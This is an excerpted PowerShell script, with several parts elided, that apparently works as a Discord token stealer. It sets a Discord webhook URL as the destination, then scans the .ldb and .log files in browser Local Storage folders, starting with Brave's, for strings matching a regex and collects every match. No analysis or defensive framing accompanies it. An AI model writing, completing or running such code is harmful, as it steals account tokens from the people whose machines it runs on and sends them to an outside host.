...
$webhook = "https://discordapp.com/api/webhooks/1500833396685930627/dVRUUvQjRL_llL73tLFDUKm5WeAkbC8_8zQGRcUudTTipIlLeM-Z2hIk__hwwmSE6Bje"
    ...
    foreach ($p in $paths) {
        ...
        Get-ChildItem "$p\*.ldb", "$p\*.log" -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                ...
                if (-not $c) { return }
                $m = $regex.Match($c)
                if ($m.Success) { $found[$m.Value] = $true }
            } catch {}
        }
    }
}
...
# ── Scan all paths ──
# Brave
Scan-Plaintext @("$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
